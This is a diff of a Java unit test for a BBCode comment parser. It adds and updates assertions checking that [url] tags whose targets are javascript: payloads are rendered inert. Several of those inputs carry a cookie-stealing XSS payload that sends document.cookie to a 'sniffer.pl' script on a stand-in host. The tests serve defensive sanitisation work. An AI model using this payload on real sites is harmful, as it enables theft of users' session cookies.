@@ -42,13 +42,15 @@ public class OldParserTest {
 
   @Test
   public void urlEscapeTest() {
-    Assert.assertEquals("<p><s>Test</s></p>",
+    Assert.assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">Test</s></p>",
         lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", false));
+    Assert.assertEquals("<p><s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p>",
+        lorCodeService.parseComment("[url]javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()[/url]", false));
   }
 
   @Test
   public void urlEscapeWithTagsTest() {
-    Assert.assertEquals("<p><s>T<i>e</i>st</s></p>",
+    Assert.assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">T<i>e</i>st</s></p>",
         lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]T[i]e[/i]st[/url]", false));
   }
 
